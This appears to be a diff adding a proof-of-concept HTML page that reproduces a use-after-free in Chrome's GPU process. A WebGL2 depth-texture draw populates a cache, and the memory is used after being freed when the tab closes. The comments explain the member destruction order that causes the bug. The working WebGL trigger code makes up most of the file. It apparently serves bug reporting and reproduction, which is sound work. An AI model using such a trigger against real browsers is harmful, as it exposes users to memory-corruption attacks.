@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<!--
+  ContextGL::PixelBufferGL destruction-order UAF repro (WebGL2 trigger)
+
+  How to use:
+    chrome --use-angle=gl repro_pixelbuffergl.html
+    Then close the tab or navigate away.
+    With ASan Chrome: expect heap-use-after-free in
+      ContextGL::PixelBufferGL::~PixelBufferGL (ContextGL.cpp:68)
+
+  What this does:
+    1. Creates a WebGL2 context (Chrome GPU process creates a ContextGL)
+    2. Uploads a depth texture with null data (sets MayNeedInit state)
+    3. Draws using the depth texture as a shadow sampler — this triggers
+       Chrome's robust resource init: Texture::ensureInitialized ->
+       TextureGL::initializeContentsImpl -> ContextGL::getDepthInitPBO,
+       which populates mDepthInitPBOs with a PixelBufferGL caching a raw
+       FunctionsGL* pointer from mRenderer->getFunctions().
+    4. On tab close / navigation, ~ContextGL() fires (it's empty).
+       C++ destroys members in reverse declaration order:
+         mRenderer (line 352) destroyed FIRST -> ~RendererGL -> FunctionsGL freed
+         mDepthInitPBOs (line 349) destroyed SECOND -> ~PixelBufferGL ->
+           functions->deleteBuffers()  [UAF: functions points to freed FunctionsGL]
+-->
+<meta charset="utf-8">
+<title>ContextGL PixelBufferGL UAF — close this tab to trigger</title>
+<style>
+  body { font: 14px monospace; background: #111; color: #ccc; padding: 20px; }
+  .ok  { color: #4f4; }
+  .err { color: #f44; }
+  .warn{ color: #fa4; }
+</style>
+<h3>ContextGL::PixelBufferGL UAF — Chrome GPU process (ANGLE GL backend)</h3>
+<canvas id="c" width="64" height="64"></canvas>
+<div id="log"></div>
+<script>
+const log = document.getElementById('log');
+function print(msg, cls) {
+    const d = document.createElement('div');
+    d.className = cls || '';
+    d.textContent = msg;
+    log.appendChild(d);
+}
+
+const gl = document.getElementById('c').getContext('webgl2');
+if (!gl) {
+    print('ERROR: WebGL2 unavailable. Launch Chrome with: --use-angle=gl', 'err');
+} else {
+    print('WebGL2 context created.', 'ok');
+    print('Renderer: ' + gl.getParameter(gl.RENDERER));
+
+    // Step 1: Create a depth texture with null data -> MayNeedInit state
+    const depthTex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, depthTex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT24, 64, 64, 0,
+                  gl.DEPTH_COMPONENT, gl.UNSIGNED_INT, null);
+    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_COMPARE_MODE, gl.COMPARE_REF_TO_TEXTURE);
+    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_COMPARE_FUNC, gl.LESS);
+    print('Depth texture created (null data -> MayNeedInit).', 'ok');
+
+    // Step 2: Draw using the depth texture as a shadow sampler.
+    // Chrome's robust resource init fires Texture::ensureInitialized on draw,
+    // which calls ContextGL::getDepthInitPBO and populates mDepthInitPBOs
+    // with a PixelBufferGL caching a raw FunctionsGL* from mRenderer.
+    const vs = `#version 300 es
+void main() { gl_Position = vec4(0.0, 0.0, 0.0, 1.0); gl_PointSize = 1.0; }`;
+    const fs = `#version 300 es
+uniform highp sampler2DShadow u;
+out highp vec4 o;
+void main() { o = vec4(texture(u, vec3(0.5, 0.5, 0.5)), 0.0, 0.0, 1.0); }`;
+
+    const prog = gl.createProgram();
+    const makeShader = (type, src) => {
+        const s = gl.createShader(type);
+        gl.shaderSource(s, src); gl.compileShader(s); return s;
+    };
+    gl.attachShader(prog, makeShader(gl.VERTEX_SHADER, vs));
+    gl.attachShader(prog, makeShader(gl.FRAGMENT_SHADER, fs));
+    gl.linkProgram(prog);
+    gl.useProgram(prog);
+    gl.uniform1i(gl.getUniformLocation(prog, 'u'), 0);
+    gl.bindTexture(gl.TEXTURE_2D, depthTex);
+    gl.drawArrays(gl.POINTS, 0, 1);
+    gl.flush();
+    print('Draw with depth shadow sampler done -> mDepthInitPBOs cache populated.', 'ok');
+    print('', '');
+    print('>>> CLOSE THIS TAB or navigate away to trigger the UAF <<<', 'warn');
+    print('', '');
+    print('Expected (ASan Chrome --use-angle=gl):', 'warn');
+    print('  heap-use-after-free in ContextGL::PixelBufferGL::~PixelBufferGL (ContextGL.cpp:68)');
+    print('  called from ~DepthInitPBOCache (member destruction, after ~RendererGL freed FunctionsGL)');
+    print('  Root: mDepthInitPBOs (ContextGL.h:349) destroyed after mRenderer (ContextGL.h:352)');
+}
+</script>
